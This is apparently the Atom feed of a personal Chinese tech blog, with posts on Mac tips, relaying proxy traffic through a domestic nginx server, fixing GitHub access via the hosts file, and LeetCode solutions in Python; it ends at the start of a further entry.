<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>生如逆旅 一苇以航</title>
  
  <subtitle>人生总有许多偶然和巧合，两条平行线，也可能会有交汇的一天。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://fansblog.club/"/>
  <updated>2020-03-12T08:35:40.077Z</updated>
  <id>https://fansblog.club/</id>
  
  <author>
    <name>流岚</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Mac使用小技巧</title>
    <link href="https://fansblog.club/2020/03/12/mac-tips/"/>
    <id>https://fansblog.club/2020/03/12/mac-tips/</id>
    <published>2020-03-12T08:19:11.000Z</published>
    <updated>2020-03-12T08:35:40.077Z</updated>
    
    <content type="html"><![CDATA[<p>此贴长期更新<a id="more"></a></p><h3 id="1-隐藏桌面所有文件-文件夹"><a href="#1-隐藏桌面所有文件-文件夹" class="headerlink" title="1. 隐藏桌面所有文件/文件夹"></a>1. 隐藏桌面所有文件/文件夹</h3><p>隐藏：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">false</span>;killall Finder</span><br></pre></td></tr></table></figure><br>恢复显示：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder CreateDesktop -bool <span class="hljs-literal">true</span>;killall Finder</span><br></pre></td></tr></table></figure></p><h3 id="2-微调音量-亮度"><a href="#2-微调音量-亮度" class="headerlink" title="2. 微调音量/亮度"></a>2. 微调音量/亮度</h3><p><code>option + shift + 音量/亮度</code></p><h3 id="3-切换应用程序"><a href="#3-切换应用程序" class="headerlink" title="3. 切换应用程序"></a>3. 切换应用程序</h3><p><code>command + Tab</code> 从左-&gt;右<br><code>command + shift + Tab</code> 反向</p><h3 id="4-常用快捷键（持续更新）"><a href="#4-常用快捷键（持续更新）" class="headerlink" title="4. 常用快捷键（持续更新）"></a>4. 常用快捷键（持续更新）</h3><ul><li>浏览器中将网页加入个人收藏：<code>command + D</code></li><li>浏览器新建标签页：<code>command + T</code></li><li>快速调用emoji表情：<code>control + command + space</code></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;此贴长期更新&lt;/p&gt;
    
    </summary>
    
    
      <category term="Daily Essays" scheme="https://fansblog.club/categories/Daily-Essays/"/>
    
    
  </entry>
  
  <entry>
    <title>通过国内服务器转发流量科学上网</title>
    <link href="https://fansblog.club/2020/02/04/network-jump/"/>
    <id>https://fansblog.club/2020/02/04/network-jump/</id>
    <published>2020-02-04T09:22:26.000Z</published>
    <updated>2020-02-04T11:58:24.048Z</updated>
    
    <content type="html"><![CDATA[<p>从除夕那天开始，我的代理服务器就被GFW墙掉了，前些天重新搭了一个，先是被封端口，过了几天ip又被墙掉了，为了解决这个问题，因此有了这篇文章。<a id="more"></a><br>具体方法借鉴于该篇文章：<a href="https://www.hijk.pw/forward-traffic-via-internal-vps/" target="_blank" rel="noopener">Click Here</a><br>如果您不愿多点击一次链接，就请继续往下看，本文对于上述博文稍作整理。<br>完成此博文所介绍的方法的基本条件：</p><ul><li>一台国内服务器，如阿里云腾讯云等，我这里以阿里云为例，系统为Ubuntu 16.04。</li><li>一台用于代理的服务器，我这里以Digitalocean为例，系统为Ubuntu 18.04.</li></ul><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p>通过国内服务器转发流量看起来是多此一举，从“国内-&gt;境外VPS“变成了”国内-&gt;国内服务器-&gt;境外VPS“，但国内大厂的服务器出入境走的都是高级路线，国内服务器与我们的延迟大概在50ms以内，这样算起来延迟是降低了。<br><img src="/2020/02/04/network-jump/3.jpg" alt="左边为自己网络ping境外VPS和阿里云，右边为阿里云ping境外VPS"><br>从上图我们可以明显看到右边加上ping阿里云的延迟明显要比直接ping境外vps的延迟要小很多。<br>该方法属于<code>硬件加速</code>，代价是要多出额外的成本租一台国内服务器，优点是更稳定，可以有效防止境外IP或者端口被封。<br>而国内服务器在这里充当的作用就是流量转发。<br>该方法共分为三个步骤：</p><ul><li>国内服务器配置流量转发程序</li><li>境外VPS配置代理程序</li><li>自己的机器配置代理至国内服务器</li></ul><p>还可以在境外的VPS上配置一些web页面，只对外开放80/443端口，其他端口对你的国内服务器的IP地址开放，这样当GFW扫描的时候也只是觉得这是一个网站而已。</p><h3 id="二、国内服务器配置流量转发程序"><a href="#二、国内服务器配置流量转发程序" class="headerlink" title="二、国内服务器配置流量转发程序"></a>二、国内服务器配置流量转发程序</h3><p>这里用到nginx来配置流量转发</p><h4 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h4><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></p><h4 id="配置文件修改"><a href="#配置文件修改" class="headerlink" title="配置文件修改"></a>配置文件修改</h4><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><br>添加<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">stream &#123;</span><br><span class="line">        server &#123;</span><br><span class="line">                listen Port; # 国内服务器的监听端口</span><br><span class="line">                proxy_pass 境外VPS的IP:Port;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>保存之后配置开机自启以及启动nginx<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="hljs-built_in">enable</span> nginx &amp;&amp; systemctl start nginx</span><br></pre></td></tr></table></figure><br>如果你的服务器是阿里云或者腾讯云诸如此类，还需要配置安全组规则，开放TCP连接的listen中配置的端口。<br>如果你之前配置过了代理服务器，那现在将自己机器上的代理软件的IP地址和端口号改为国内这台服务器的地址和端口，应该就能实现科学上网了。<br>如果不行，请检查一下国内服务器有没有配置防火墙规则等。</p><h3 id="三、配置境外VPS"><a href="#三、配置境外VPS" class="headerlink" title="三、配置境外VPS"></a>三、配置境外VPS</h3><p>如果之前你的境外VPS没有配置过代理程序，配置代理的方法具体请参考我的另一篇文章：<a href="https://fansblog.club/2019/06/29/ipv6/">Click Here</a><br>对境外VPS配置一番，主要是为了降低GFW的干扰，减少IP地址被墙的几率。<br><code>除了ssh的22端口，网站的80/443端口，其他端口只允许国内那台服务器的连接。</code></p><h4 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h4><p>这里使用的是ubuntu的防火墙<code>ufw</code>。<br>ufw命令举例：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 允许某个端口连接</span></span><br><span class="line">ufw allow port</span><br><span class="line"><span class="hljs-comment"># 允许此IP访问所有的本机端口</span></span><br><span class="line">ufw allow from IPv4</span><br><span class="line"><span class="hljs-comment"># 开启防火墙</span></span><br><span class="line">ufw <span class="hljs-built_in">enable</span></span><br></pre></td></tr></table></figure><br>经过上述配置后，GFW探测你的VPS，除了ssh和网站的常用端口外，ss/ssr的端口根本无法连接，IP地址的被墙的几率自然就降低了。</p><h4 id="将境外VPS伪装的更像一个网站"><a href="#将境外VPS伪装的更像一个网站" class="headerlink" title="将境外VPS伪装的更像一个网站"></a>将境外VPS伪装的更像一个网站</h4><p>为了把境外VPS做的更像一个网站，因此我们在这台服务器上再放一些web页面。<br>同样的安装nginx<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install nginx</span><br></pre></td></tr></table></figure><br>nginx安装完成的时候会自动启动，打开浏览器输入你服务器的IP地址，你会看到如下的界面。<br><img src="/2020/02/04/network-jump/4.jpg" alt="Welcome"><br>nginx的默认目录在<code>/var/www/html/</code><br>我们将静态页面放到这里面就可以了，一定要有个index.html哦。<br>因为我的博客repo在我的github上，因此我就直接git clone到上面这个目录下了。<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">cd</span> /var/www/html/</span><br><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/aestheticisma/aestheticisma.github.io</span><br><span class="line"><span class="hljs-comment"># 之后将aestheticisma.github.io里面的东西全部移动到/var/www/html/下</span></span><br><span class="line"><span class="hljs-built_in">cd</span> aestheticisma.github.io/</span><br><span class="line">cp -r ./* ..</span><br></pre></td></tr></table></figure><br>再次在浏览器输入服务器ip地址就会发现有东西显示了。<br>这样我们的境外VPS伪装完成了。</p><h3 id="四、关于自己机器上的代理配置说明"><a href="#四、关于自己机器上的代理配置说明" class="headerlink" title="四、关于自己机器上的代理配置说明"></a>四、关于自己机器上的代理配置说明</h3><p>如果你之前用过shadowsocks诸如此类代理软件，就是相当于把ip地址和端口号换成了国内服务器的ip地址和在nginx中配置的监听端口号，其他的密码等都是和之前一样的，因为代理服务还是配置在境外VPS上的，国内的服务器只是起到了一个转发流量的作用。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从除夕那天开始，我的代理服务器就被GFW墙掉了，前些天重新搭了一个，先是被封端口，过了几天ip又被墙掉了，为了解决这个问题，因此有了这篇文章。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Daily Essays" scheme="https://fansblog.club/categories/Daily-Essays/"/>
    
    
  </entry>
  
  <entry>
    <title>Solve无法访问github的问题</title>
    <link href="https://fansblog.club/2020/02/04/unable-access-github/"/>
    <id>https://fansblog.club/2020/02/04/unable-access-github/</id>
    <published>2020-02-03T16:16:58.000Z</published>
    <updated>2020-02-03T16:35:35.445Z</updated>
    
    <content type="html"><![CDATA[<p>前几天发现家里的网络访问不了github了，开始没太在意，因为挂着代理也能访问不影响，直到今天准备push的时候发现根本push不上去。现将解决方法整理如下。<a id="more"></a></p><h3 id="一、访问github-IP查询网址"><a href="#一、访问github-IP查询网址" class="headerlink" title="一、访问github IP查询网址"></a>一、访问github IP查询网址</h3><p><a href="http://www.github.com.ipaddress.com/" target="_blank" rel="noopener">Click Here</a><br>你会看到如下界面<br><img src="/2020/02/04/unable-access-github/1.jpg" alt="1.jpg"></p><h3 id="二、修改Hosts文件"><a href="#二、修改Hosts文件" class="headerlink" title="二、修改Hosts文件"></a>二、修改Hosts文件</h3><ul><li><p>Mac<br>位置：<code>/etc/hosts</code></p></li><li><p>Win<br>位置：<code>C:\Windows\system32\drivers\etc</code></p></li></ul><p>添加在IP查询页面看到的IP地址：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.30.253.113github.com</span><br></pre></td></tr></table></figure></p><h3 id="三、刷新DNS缓存"><a href="#三、刷新DNS缓存" class="headerlink" title="三、刷新DNS缓存"></a>三、刷新DNS缓存</h3><ul><li><p>Mac<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dscacheutil -flushcache</span><br></pre></td></tr></table></figure></p></li><li><p>Win<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/flushdns</span><br></pre></td></tr></table></figure></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前几天发现家里的网络访问不了github了，开始没太在意，因为挂着代理也能访问不影响，直到今天准备push的时候发现根本push不上去。现将解决方法整理如下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Daily Essays" scheme="https://fansblog.club/categories/Daily-Essays/"/>
    
    
  </entry>
  
  <entry>
    <title>LeetCode DAY 7 (11-12)</title>
    <link href="https://fansblog.club/2020/01/19/leetcode-day7/"/>
    <id>https://fansblog.club/2020/01/19/leetcode-day7/</id>
    <published>2020-01-19T03:28:05.000Z</published>
    <updated>2020-01-19T09:37:17.678Z</updated>
    
    <content type="html"><![CDATA[<p>我果然还是一条懒狗，拖更了两天，今天补上。<a id="more"></a></p><h3 id="11-盛最多水的容器（中等）"><a href="#11-盛最多水的容器（中等）" class="headerlink" title="11. 盛最多水的容器（中等）"></a>11. 盛最多水的容器（中等）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定n个非负整数a1，a2，…，an，每个数代表坐标中的一个点(i, ai)。在坐标内画n条垂直线，垂直线i的两个端点分别为(i, ai)和(i, 0)。找出其中的两条线，使得它们与x轴共同构成的容器可以容纳最多的水。<br><strong>说明</strong>：你不能倾斜容器，且n的值至少为2。<br><img src="/2020/01/19/leetcode-day7/question_11.jpg" alt="question_11.jpg"><br>图中垂直线代表输入数组[1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为49。</p><h5 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: [1,8,6,2,5,4,8,3,7]</span><br><span class="line">输出: 49</span><br></pre></td></tr></table></figure></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：暴力穷举法"><a href="#解法1：暴力穷举法" class="headerlink" title="解法1：暴力穷举法"></a>解法1：暴力穷举法</h5><p>本懒狗第一个想到的办法就是写两个for循环穷举所有情况…<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(self, height)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type height: List[int]</span></span><br><span class="line"><span class="hljs-string">        :rtype: int</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        maxarea = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(height)<span class="hljs-number">-1</span>):</span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(i+<span class="hljs-number">1</span>, len(height)):</span><br><span class="line">                area = (j-i)*min(height[i], height[j])</span><br><span class="line">                <span class="hljs-keyword">if</span> maxarea &lt; area:</span><br><span class="line">                    maxarea = area</span><br><span class="line">        <span class="hljs-keyword">return</span> maxarea</span><br></pre></td></tr></table></figure></p><h5 id="解法2：（双指针法）利用题意中的特点"><a href="#解法2：（双指针法）利用题意中的特点" class="headerlink" title="解法2：（双指针法）利用题意中的特点"></a>解法2：（双指针法）利用题意中的特点</h5><p>我们知道，盛水的多少取决于容器最短的那根木板，还有两块木板之间的距离。<br>我们将初始位置放在列表的开始和末尾，为了增大两块木板之间的面积，我们不得不将较短的木板向内侧移动以寻求更长的木板，这样虽然会导致木板之间的距离变短，但还是有可能找到比初始位置面积要大的情况存在。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(self, height)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type height: List[int]</span></span><br><span class="line"><span class="hljs-string">        :rtype: int</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        left, right = <span class="hljs-number">0</span>, len(height)<span class="hljs-number">-1</span></span><br><span class="line">        <span class="hljs-comment"># 记录面积</span></span><br><span class="line">        maxarea = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="hljs-comment"># 两块木板之间的距离</span></span><br><span class="line">            b = right - left</span><br><span class="line">            <span class="hljs-keyword">if</span> height[left] &lt; height[right]:</span><br><span class="line">                h = height[left]</span><br><span class="line">                left += <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                h = height[right]</span><br><span class="line">                right -= <span class="hljs-number">1</span></span><br><span class="line">            area = b*h</span><br><span class="line">            <span class="hljs-keyword">if</span> maxarea &lt; area:</span><br><span class="line">                maxarea = area</span><br><span class="line">        <span class="hljs-keyword">return</span> maxarea</span><br></pre></td></tr></table></figure></p><h3 id="12-整数转罗马数字（中等）"><a href="#12-整数转罗马数字（中等）" class="headerlink" title="12. 整数转罗马数字（中等）"></a>12. 整数转罗马数字（中等）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>罗马数字包含以下七种字符： <code>I</code>， <code>V</code>， <code>X</code>， <code>L</code>，<code>C</code>，<code>D</code>和<code>M</code>。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">字符          数值</span><br><span class="line">I             1</span><br><span class="line">V             5</span><br><span class="line">X             10</span><br><span class="line">L             50</span><br><span class="line">C             100</span><br><span class="line">D             500</span><br><span class="line">M             1000</span><br></pre></td></tr></table></figure><br>例如，罗马数字<code>2</code>写做<code>II</code>，即为两个并列的<code>I</code>。<code>12</code>写做<code>XII</code>，即为<code>X</code>+<code>II</code>。<code>27</code>写做<code>XXVII</code>,即为<code>XX</code>+<code>V</code>+<code>II</code>。<br>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如<code>4</code>不写做<code>IIII</code>，而是<code>IV</code>。数字<code>1</code>在数字<code>5</code>的左边，所表示的数等于大数<code>5</code>减小数<code>1</code>得到的数值<code>4</code> 。同样地，数字<code>9</code>表示为<code>IX</code>。这个特殊的规则只适用于以下六种情况：</p><ul><li><code>I</code>可以放在<code>V</code>(5)和<code>X</code>(10)的左边，来表示<code>4</code>和<code>9</code>。</li><li><code>X</code>可以放在<code>L</code>(50)和<code>C</code>(100)的左边，来表示<code>40</code>和<code>90</code>。 </li><li><code>C</code>可以放在<code>D</code>(500)和<code>M</code>(1000)的左边，来表示<code>400</code>和<code>900</code>。</li></ul><p>给定一个整数，将其转为罗马数字。输入确保在 1 到 3999 的范围内。</p><h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: 3</span><br><span class="line">输出: &quot;III&quot;</span><br></pre></td></tr></table></figure></p><h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: 4</span><br><span class="line">输出: &quot;IV&quot;</span><br></pre></td></tr></table></figure></p><h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: 9</span><br><span class="line">输出: &quot;IX&quot;</span><br></pre></td></tr></table></figure></p><h5 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: 58</span><br><span class="line">输出: &quot;LVIII&quot;</span><br><span class="line">解释: L = 50, V = 5, III = 3.</span><br></pre></td></tr></table></figure></p><h5 id="示例5"><a href="#示例5" class="headerlink" title="示例5:"></a>示例5:</h5><p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: 1994</span><br><span class="line">输出: &quot;MCMXCIV&quot;</span><br><span class="line">解释: M = 1000, CM = 900, XC = 90, IV = 4.</span><br></pre></td></tr></table></figure></p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：分情况讨论"><a href="#解法1：分情况讨论" class="headerlink" title="解法1：分情况讨论"></a>解法1：分情况讨论</h5><p>这是我最开始的想法：既然这道题有这么多种情况，那我就直接分情况讨论吧。<br>总共大致分成了三种情况，一种是题目中给出的，也就是单个字符的数值，和特例（数字小的数字在大的数字的左边的情况）；第二种是数字大于5(50,500等)的，最后一种当然就是数字小于5(50,500等)的。将属于第一种情况的键值对写入字典中。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">intToRoman</span><span class="hljs-params">(self, num)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type num: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        dict_str = &#123;<span class="hljs-number">1</span>:<span class="hljs-string">'I'</span>, <span class="hljs-number">5</span>:<span class="hljs-string">'V'</span>, <span class="hljs-number">10</span>:<span class="hljs-string">'X'</span>, <span class="hljs-number">50</span>:<span class="hljs-string">'L'</span>, <span class="hljs-number">100</span>:<span class="hljs-string">'C'</span>, <span class="hljs-number">500</span>:<span class="hljs-string">'D'</span>, <span class="hljs-number">1000</span>:<span class="hljs-string">'M'</span>, <span class="hljs-number">4</span>: <span class="hljs-string">'IV'</span>, <span class="hljs-number">9</span>:<span class="hljs-string">'IX'</span>, <span class="hljs-number">40</span>:<span class="hljs-string">'XL'</span>, <span class="hljs-number">90</span>:<span class="hljs-string">'XC'</span>, <span class="hljs-number">400</span>:<span class="hljs-string">'CD'</span>, <span class="hljs-number">900</span>:<span class="hljs-string">'CM'</span>&#125;</span><br><span class="line">        <span class="hljs-comment"># 用来存储转换成的罗马数字符号的列表，是倒着存储的，因此最后需要重排序</span></span><br><span class="line">        ans_list = []</span><br><span class="line">        <span class="hljs-comment"># 用来存储数字位的倍数</span></span><br><span class="line">        count = <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">while</span> num != <span class="hljs-number">0</span>:</span><br><span class="line">            a = num % <span class="hljs-number">10</span></span><br><span class="line">            num_str = a * count</span><br><span class="line">            <span class="hljs-comment"># 在字典中，取出value即是该位的罗马数字值</span></span><br><span class="line">            <span class="hljs-keyword">if</span> num_str <span class="hljs-keyword">in</span> dict_str:</span><br><span class="line">                ans_list.append(dict_str[num_str])</span><br><span class="line">            <span class="hljs-comment"># 大于5，需要变成'5的倍数的罗马值'+'某个1倍数的罗马值'*b</span></span><br><span class="line">            <span class="hljs-keyword">elif</span> a&gt;<span class="hljs-number">5</span>:</span><br><span class="line">                b = a<span class="hljs-number">-5</span></span><br><span class="line">                ans_list.append(dict_str[<span class="hljs-number">5</span>*count]+dict_str[count]*b)</span><br><span class="line">            <span class="hljs-comment"># 小于5，即 '某个1倍数的罗马值'*a</span></span><br><span class="line">            <span class="hljs-keyword">elif</span> a&lt;<span class="hljs-number">5</span>:</span><br><span class="line">                ans_list.append(dict_str[count]*a)</span><br><span class="line">            count *= <span class="hljs-number">10</span></span><br><span class="line">            num //= <span class="hljs-number">10</span></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(ans_list[::<span class="hljs-number">-1</span>])</span><br></pre></td></tr></table></figure></p><h5 id="解法2：贪心算法"><a href="#解法2：贪心算法" class="headerlink" title="解法2：贪心算法"></a>解法2：贪心算法</h5><p>我们每次用最大面值的来替换，可以保证用的罗马字符最少且最终的组合唯一。<br>其实我们仔细看这些面值，除了特殊的<code>4</code>,<code>9</code>,<code>40</code>,<code>90</code>之类的数，其余都是要么小于5，然后就是几个<code>I</code>连在一起，要么就是大与5，在几个<code>I</code>的左边再加上<code>5</code>(50,500等)对应的罗马数字。<br>只要除去特例，我们每次判断，取面值最大的，然后把该符号加在后面即可，对于特例，直接在字典或列表中加入即可。</p><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">intToRoman</span><span class="hljs-params">(self, num)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type num: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        nums = [<span class="hljs-number">1000</span>, <span class="hljs-number">900</span>, <span class="hljs-number">500</span>, <span class="hljs-number">400</span>, <span class="hljs-number">100</span>, <span class="hljs-number">90</span>, <span class="hljs-number">50</span>, <span class="hljs-number">40</span>, <span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>]</span><br><span class="line">        romans = [<span class="hljs-string">"M"</span>, <span class="hljs-string">"CM"</span>, <span class="hljs-string">"D"</span>, <span class="hljs-string">"CD"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"XC"</span>, <span class="hljs-string">"L"</span>, <span class="hljs-string">"XL"</span>, <span class="hljs-string">"X"</span>, <span class="hljs-string">"IX"</span>, <span class="hljs-string">"V"</span>, <span class="hljs-string">"IV"</span>, <span class="hljs-string">"I"</span>]</span><br><span class="line">        ans = <span class="hljs-string">''</span></span><br><span class="line">        <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">13</span>):</span><br><span class="line">            <span class="hljs-keyword">while</span> num &gt;= nums[index]:</span><br><span class="line">                ans += romans[index]</span><br><span class="line">                num -= nums[index]</span><br><span class="line">        <span class="hljs-keyword">return</span> ans</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我果然还是一条懒狗，拖更了两天，今天补上。&lt;/p&gt;
    
    </summary>
    
    
      <category term="LeetCode系列" scheme="https://fansblog.club/categories/LeetCode%E7%B3%BB%E5%88%97/"/>
    
    
  </entry>
  
  <entry>
    <title>LeetCode DAY 6 (9-10)</title>
    <link href="https://fansblog.club/2020/01/15/leetcode-day6/"/>
    <id>https://fansblog.club/2020/01/15/leetcode-day6/</id>
    <published>2020-01-15T09:05:22.000Z</published>
    <updated>2020-01-15T09:31:37.485Z</updated>
    
